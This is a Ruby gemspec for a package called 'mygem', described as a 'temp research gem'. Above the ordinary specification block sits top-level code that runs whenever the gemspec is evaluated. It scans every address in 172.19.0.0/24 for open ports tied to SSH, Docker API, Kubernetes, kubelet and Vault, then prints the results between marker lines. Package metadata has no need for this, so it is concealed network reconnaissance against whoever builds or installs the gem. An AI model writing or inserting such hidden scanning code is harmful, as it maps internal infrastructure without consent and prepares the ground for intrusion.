begin
  require "socket"
  require "timeout"

  puts "==SUBNETSCAN=="
  start = Time.now
  open_found = []
  mutex = Mutex.new
  ports = [22, 80, 443, 2375, 2376, 3000, 5000, 6443, 8080, 8200, 9090, 10250]

  hosts = (0..255).map { |i| "172.19.0.#{i}" }
  hosts.each_slice(16) do |host_batch|
    threads = host_batch.map do |host|
      Thread.new do
        ports.each do |port|
          begin
            Timeout.timeout(0.6) do
              s = TCPSocket.new(host, port)
              mutex.synchronize { open_found << "#{host}:#{port}" }
              s.close
            end
          rescue
          end
        end
      end
    end
    threads.each(&:join)
  end

  puts "elapsed=#{(Time.now-start).round(1)}s hosts=256 ports_per_host=#{ports.size}"
  puts "OPEN: #{open_found.inspect}"
  puts "==SUBNETSCAN_DONE=="
rescue => e
  warn "fingerprint error: #{e}"
end

Gem::Specification.new do |s|
  s.name        = "mygem"
  s.version     = "0.0.15"
  s.summary     = "temp research gem"
  s.authors     = ["researcher"]
  s.files       = ["lib/mygem.rb"]
  s.require_paths = ["lib"]
end
